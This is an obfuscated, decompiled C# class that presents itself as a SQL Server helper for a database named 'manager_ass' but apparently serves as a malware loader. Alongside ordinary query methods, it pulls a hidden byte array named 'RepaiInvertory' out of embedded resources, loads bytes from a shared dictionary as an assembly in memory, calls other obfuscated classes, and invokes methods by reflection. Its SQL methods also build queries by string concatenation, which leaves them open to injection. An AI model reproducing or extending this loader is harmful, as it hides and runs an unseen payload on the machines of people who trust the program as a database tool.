using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using As38;
using Fq7;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using f1C;

namespace Rm2;

public class t4D
{
	protected SqlConnection SqlCon;

	protected SqlCommand SqlCom;

	protected SqlDataReader Sqldreader;

	protected SqlDataAdapter SqlDa;

	protected SqlCommandBuilder SqlComb;

	private string ConnectionString;

	public t4D()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		ConnectionString = "Data Source=BK-PC;Initial Catalog=manager_ass;Integrated Security=True";
		SqlCon = new SqlConnection();
		SqlCon.set_ConnectionString(ConnectionString);
	}

	internal static bool r1Y(string Zr6)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(Zr6);
			webRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	public bool f7N()
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		bool result = default(bool);
		try
		{
			if (SqlCon.get_State() != ConnectionState.Open)
			{
				SqlCon.set_ConnectionString(ConnectionString);
				SqlCon.Open();
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			MessageBox.Show("Can not connect to database, please choose a database!", "Connect Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	protected bool Gw3()
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_002b: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (SqlCon.get_State() != 0)
			{
				SqlCon.Close();
				return true;
			}
			return false;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			SqlException val2 = val;
			Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Close Database");
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool Rm3(string z8Y, bool Tk8 = false)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		//IL_0031: Expected O, but got Unknown
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		bool result = default(bool);
		if (f7N())
		{
			try
			{
				SqlCom = new SqlCommand(z8Y, SqlCon);
				SqlCom.ExecuteNonQuery();
				return true;
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				if (Tk8)
				{
					Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Execute!");
				}
				result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			finally
			{
				Gw3();
				((Component)(object)SqlCom).Dispose();
			}
		}
		return result;
	}

	internal static byte[] b4D(string[] i4Q, int r8M)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[i4Q.Length - 1 + 1];
				int num = i4Q.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						array[i] = i4Q[i].Replace(".resources", "");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)Ks8.mDic["Ass"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.ConditionalCompareObjectEqual(dictionaryEntry.Key, (object)"RepaiInvertory", false))
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public SqlDataReader w5Q(string q2G)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		//IL_003c: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (f7N())
			{
				SqlCom = new SqlCommand(q2G, SqlCon);
				Sqldreader = SqlCom.ExecuteReader();
			}
			return Sqldreader;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			SqlException val2 = val;
			Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get DataReader");
			SqlDataReader result = null;
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
			Gw3();
			((Component)(object)SqlCom).Dispose();
		}
	}

	public object Nc1(string De7)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		object result = null;
		try
		{
			if (f7N())
			{
				SqlCom = new SqlCommand(De7, SqlCon);
				result = RuntimeHelpers.GetObjectValue(SqlCom.ExecuteScalar());
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)16, (object)"Get Scalar");
			ProjectData.ClearProjectError();
		}
		finally
		{
			Gw3();
			((Component)(object)SqlCom).Dispose();
		}
		return result;
	}

	public DataTable Yp0(string Qx0)
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006c: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		string text = string.Empty;
		try
		{
			text = Qx0.Substring(14);
			text = text.Substring(0, checked(text.IndexOf(" ") + 1));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		DataTable dataTable = new DataTable(text);
		SqlDa = new SqlDataAdapter(Qx0, SqlCon);
		if (f7N())
		{
			try
			{
				((DbDataAdapter)(object)SqlDa).Fill(dataTable);
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get Datatable");
				ProjectData.ClearProjectError();
			}
			finally
			{
				Gw3();
				((Component)(object)SqlDa).Dispose();
			}
		}
		return dataTable;
	}

	public static string r7B(string Cp3)
	{
		Type type = (Type)Ks8.mDic[Ks8.T];
		return Conversions.ToString(type.InvokeMember(Cp3, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, null));
	}

	public DataTable Zt8(string Cw0, string Bc0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_0047: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		DataTable dataTable = new DataTable(Cw0);
		SqlDa = new SqlDataAdapter("Select * from " + Cw0 + " Where " + Bc0, SqlCon);
		if (f7N())
		{
			try
			{
				((DbDataAdapter)(object)SqlDa).Fill(dataTable);
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get DataTable");
				ProjectData.ClearProjectError();
			}
			finally
			{
				Gw3();
				((Component)(object)SqlDa).Dispose();
			}
		}
		return dataTable;
	}

	public bool t5P(string Wq6, DataTable Jn1, bool Da5 = false)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		SqlDa = new SqlDataAdapter();
		SqlDa.set_SelectCommand(new SqlCommand(Wq6, SqlCon));
		SqlComb = new SqlCommandBuilder(SqlDa);
		try
		{
			if (f7N())
			{
				((DbDataAdapter)(object)SqlDa).Update(Jn1);
				return true;
			}
			return false;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (Da5)
			{
				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)16, (object)"Warning");
			}
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
			Gw3();
			((Component)(object)SqlDa).Dispose();
			((Component)(object)SqlComb).Dispose();
		}
	}

	internal static void w0D()
	{
		Assembly value = Thread.GetDomain().Load((byte[])Ks8.mDic[Ks8.mArray]);
		Ks8.mDic.Add("Ass2", value);
		value = null;
		if (a6L.n6T())
		{
			p8N1.Yz7r();
		}
	}

	protected void Do2()
	{
		Gw3();
		GC.SuppressFinalize(this);
	}
}
